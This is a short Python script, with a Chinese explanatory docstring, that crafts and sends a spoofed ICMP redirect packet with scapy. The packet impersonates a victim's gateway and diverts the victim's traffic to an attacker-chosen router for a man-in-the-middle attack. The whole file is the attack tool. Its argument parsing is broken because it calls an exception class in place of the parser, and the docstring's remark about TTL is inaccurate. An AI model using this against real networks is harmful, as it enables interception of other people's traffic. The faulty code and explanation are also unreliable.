#!/usr/bin/env python
# coding: utf-8

"""
通过ARP缓存中毒来进行中间人攻击是大多数人都了解的手段。
比ARP欺骗更隐蔽的是用ICMP重定向来实现中间人攻击。
攻击者只需要一个数据包来重定向整个链路到一个特殊的路由，比如默认网关。
ICMP协议是IP协议的出错控制协议。它被用来告诉计算机另一台主机、整个网络或者协议是否可达。
通过TTL（time to live）来告诉计算机是否有更近的路由
"""
import sys
import getopt
from scapy.all import send, IP, ICMP

target = None
old_gw = None  # address of original gateway
new_gw = None


def usage():
    print sys.argv[0] + """
    -t <target>
    -o <old_gw>
    -n <new_gw>"""
    sys.exit(1)

if len(sys.argv) < 4:
    usage()
    sys.exit(1)

try:
    cmd_opts = "t:o:n:r"
    opts, args = getopt.GetoptError(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-t":
        target = opt[1]
    elif opt[0] == "-o":
        old_gw = opt[1]
    elif opt[0] == "-n":
        new_gw = opt[1]
    else:
        usage()

packet = IP(src=old_gw, dst=target) / \
        ICMP(type=5, code=1, gw=new_gw) / \
        IP(src=target, dst='0.0.0.0')

send(packet)
